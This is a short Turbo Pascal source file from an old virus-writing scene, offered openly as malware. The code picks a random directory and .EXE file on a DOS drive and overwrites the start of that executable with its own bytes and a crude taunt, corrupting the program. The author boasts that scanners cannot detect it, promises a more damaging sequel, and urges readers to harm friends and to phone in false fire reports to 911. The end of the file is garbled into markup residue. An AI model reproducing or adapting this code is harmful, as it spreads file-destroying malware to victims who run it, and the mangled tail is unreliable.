

{This program selects a RANDOM Directory and EXE file, then attaches to it.
That's it! look for a <ahem> Version 2.0 at a board near you, where the 
fuck over's get REAL GOOD!!!}






Program Attacher;
{$I-}

Uses Dos;

Const cocksize = 4464;

Procedure Attach(Myname,Filename : String);

Var Inread, Outwrite : Byte;
    Orgas            :Integer;
    Notice           :String;
    Thisfile, FuckedFile :File;

Begin
assign (ThisFile,MyName);
Assign (FuckedFile,FileName);
Reset (ThisFile,1);
ReSet (FuckedFile,1);
If cocksize>Sizeof(FuckedFile) then begin 
For Orgas:=1 to Cocksize do begin
    BlockRead(ThisFile,Inread,Sizeof(Inread));
    BlockWrite(FuckedFile,InRead,Sizeof(InRead));
end;  {Orgasim}  
Notice:=('Hey, horney, you shoulda used a CONDOM!!!');
For Orgas:=1 to Length(Notice) do begin
    blockWrite(FuckedFile,Notice[Orgas],1); 

end; {Use a condom Message}
end; {Cocksize test} 
Close (FuckedFile);
close (ThisFile); 
end; {attach shit}

Procedure FindFile;
Var
   Fileinfo : SearchRec;
   Path     : Array [1..20] of String[30];
   Name     : Array [1..200] of String[30];
   err      : Integer;
   nump     : Integer;
   Drand, Frand : word;
   Pather, Namer,y  : String[30];
   x        :Integer;
   z        :Byte;

label Mistake;

Begin
Nump:=0;
FindFirst('\*.*', Directory, Fileinfo);
Err:=DosError;
While Err=0 do
begin
         If (Fileinfo.Attr = Directory) and (Fileinfo.NAME <> '..') then begin
         If Fileinfo.Name=Path[Nump] then Err:=1;
         Nump:=Nump+1;
         Path[Nump]:=Fileinfo.name;
Mistake:end;
FindNext(Fileinfo);
end;

{Randomly Pick the Directory}
Randomize;
Drand:=(Random(NUMP-1))+1;
Pather:=Path[Drand];

{Find some EXE Philez}
Nump:=0;
Findfirst ('\'+ Pather + '\*.exe', Anyfile, Fileinfo);
Err:=DosError;
While Err = 0 do
begin
    {If Fileinfo.Name=Name[Nump] then Err:=2;}
    Nump:=Nump+1;
    Name[Nump]:=Fileinfo.name;
    FindNext(Fileinfo);
    If Fileinfo.name=Name[Nump] then Err:=2;
end;

{Pick the EXE file!!!}
Frand:=Random(Nump-1)+1;
Namer:=Name[Frand];

{Tell me}
If Nump<1 then="" begin="" writeln="" ('there="" are="" no="" exe="" files="" in="" ',="" pather);="" readln;="" halt(1);="" end;="" write="" ('you="" have="" picked="" the="" file:="" ');="" y:='\' +pather+'\'+namer;="" writeln="" (y);="" attach(paramstr(0),y);="" end;="" begin="" findfile;="" halt(1);="" end.="" a="" simple="" program.="" just="" run,="" and="" it="" will="" find="" a="" exe="" file="" some="" where="" on="" your="" hd,="" and="" attach="" to="" that="" file.="" so="" far,="" this="" can't="" even="" be="" detected="" by="" scan="" or="" that="" shit!="" also,="" soon="" to="" cum,="" the="" orgasim="" virus,="" that="" will="" do="" more="" attaching="" and="" damage.="" have="" phun="" with="" the="" program!="" disclaimer:="" this="" file="" is="" for="" informitive="" use="" only!="" the="" information="" given="" here="" must="" not="" be="" used!="" any="" problems="" that="" cum="" to="" your="" doorstep="" because="" of="" this,="" must="" not="" be="" refered="" to="" me=""></1><that is,="" if="" i="" gave="" my="" name="">...Ok, enuf of this SHIT! Go fuck over a friend, just
            don't call me, k? 




Authors Notes: Anarchy Rulez. Phreaking Rulez. Cracking is the BEST!
               And remember: When in doubt, call 911 and say there's a
               fire!




</that></ahem>